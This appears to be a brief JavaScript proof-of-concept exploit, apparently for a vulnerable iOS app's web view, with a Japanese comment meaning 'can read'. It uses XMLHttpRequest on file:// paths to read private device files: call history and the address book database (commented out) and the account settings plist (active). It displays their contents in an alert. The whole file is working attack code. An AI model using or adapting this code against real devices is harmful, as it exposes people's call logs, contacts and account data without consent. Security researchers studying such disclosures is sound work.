// http://ma.la/tmp/boxcar.js

// よめる
//var file = 'file:///private/var/wireless/Library/CallHistory/call_history.db';
//var file = 'file:///private/var/mobile/Library/AddressBook/AddressBook.sqlitedb';
var file = 'file:///private/var/mobile/Library/Preferences/com.apple.accountsettings.plist';

try {
  var req = new XMLHttpRequest;
  req.open("GET", file, true);
  req.onload = function(){ alert(req.responseText) };
  req.onerror = function(){ alert("XHRError") };
  req.send(null);
} catch(e){
  alert(e)
}